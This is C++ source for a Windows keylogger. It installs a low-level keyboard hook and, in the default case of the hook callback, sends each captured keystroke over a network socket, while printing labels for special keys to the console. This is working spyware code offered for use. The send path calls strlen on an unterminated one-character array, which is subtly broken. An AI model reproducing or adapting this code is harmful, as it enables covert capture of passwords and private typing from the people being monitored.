#include <iostream>
#include <ctime>
#include "Header.h"

HHOOK hook = NULL;
SOCKET globalSock = INVALID_SOCKET;

LRESULT CALLBACK LowLevelKeyboardProc(int code, WPARAM wParam, LPARAM lParam)
{
	PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)(lParam);
	if (wParam == WM_KEYDOWN) {
		switch (p->vkCode) {
		case VK_CAPITAL:
			std::cout << "[CAPSLOCK]";
			break;
		case VK_SHIFT:
			std::cout << "[SHIFT]";
			break;
		case VK_LCONTROL:
			std::cout << "[LCONTROL]";
			break;
		case VK_RCONTROL:
			std::cout << "[RCONTROL]";
			break;
		case VK_INSERT:
			std::cout << "[INSERT]";
			break;
		case VK_END:
			std::cout << "[END]";
			break;
		case VK_PRINT:
			std::cout << "[PrtScr]";
			break;
		case VK_DELETE:
			std::cout << "[DEL]";
			break;
		case VK_BACK:
			std::cout << "[BACKSPACE]";
			break;
		case VK_LEFT:
			std::cout << "[LEFT]";
			break;
		case VK_RIGHT:
			std::cout << "[RIGHT]";
			break;
		case VK_UP:
			std::cout << "[UP]";
			break;
		case VK_DOWN:
			std::cout << "[DOWN]";
			break;
		case VK_RETURN:
			std::cout << "[ENTER]";
			break;
		default: 
			
			char character[] = { char(tolower(p->vkCode)) };
			send(globalSock, character, (int)strlen(character), 0);
			
		}
	}
	return CallNextHookEx(hook, code, wParam, lParam);
}

int startLogging(SOCKET sock)
{
	globalSock = sock;
	std::cout << "Keylogger Started at " << std::endl;
	hook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, NULL);

	MessageBox(NULL, "Press OK to stop logging.", "Information", MB_OK);
	return 0;

}